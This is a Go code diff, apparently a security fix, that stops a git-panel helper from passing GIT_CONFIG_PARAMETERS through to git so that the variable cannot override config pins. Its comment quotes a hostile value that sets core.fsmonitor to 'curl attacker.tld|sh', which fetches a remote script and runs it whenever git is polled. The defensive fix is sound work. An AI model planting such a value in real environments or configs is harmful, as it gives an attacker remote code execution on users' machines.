@@ -374,14 +374,36 @@ func readPins(dir string) ([]cfgFile, []cfg) {
 // the existing entries, so they take precedence over them (git reads higher
 // indices last) without discarding config the user injected through the same
 // mechanism. A malformed count is treated as zero and replaced.
+//
+// GIT_CONFIG_PARAMETERS is dropped rather than honoured, because it is the one
+// thing a pin cannot be numbered above. git has two environment channels for
+// command-line config and reads them in a fixed order: the numbered pairs
+// first, then GIT_CONFIG_PARAMETERS — so the second wins the last-value
+// resolution no matter what index the pins are given. A single
+//
+//	GIT_CONFIG_PARAMETERS="'core.fsmonitor=curl attacker.tld|sh'"
+//
+// in the environment therefore voided every pin in this file, and `git status
+// --porcelain` — polled every five seconds for the git panel, in every
+// permission mode, before the user has typed anything — executed it. The pin
+// for the same key was read, numbered and delivered, and simply never in the
+// same precedence form as the value it was there to overrule.
+//
+// It is in the environment the same way XDG_CONFIG_HOME is: an .envrc in an
+// extracted tree, direnv, and secretenv.Scrubbed passes every GIT_* through.
+// Nothing legitimate sets it either — git exports it to its own children to
+// carry `-c` down, and Tapioca is not one of those — so dropping it costs
+// nothing and is the only reading a channel this package cannot outrank can be
+// given.
 func configEnv(base []string, pins []cfg) []string {
-	if len(pins) == 0 {
-		return base
-	}
 	start := 0
 	out := make([]string, 0, len(base)+len(pins)*2+1)
 	for _, kv := range base {
-		if name, val, ok := strings.Cut(kv, "="); ok && name == "GIT_CONFIG_COUNT" {
+		name, val, ok := strings.Cut(kv, "=")
+		if ok && name == "GIT_CONFIG_PARAMETERS" {
+			continue // cannot be ranked below a pin, so it does not travel
+		}
+		if ok && name == "GIT_CONFIG_COUNT" {
 			if n, err := strconv.Atoi(strings.TrimSpace(val)); err == nil && n > 0 {
 				start = n
 			}
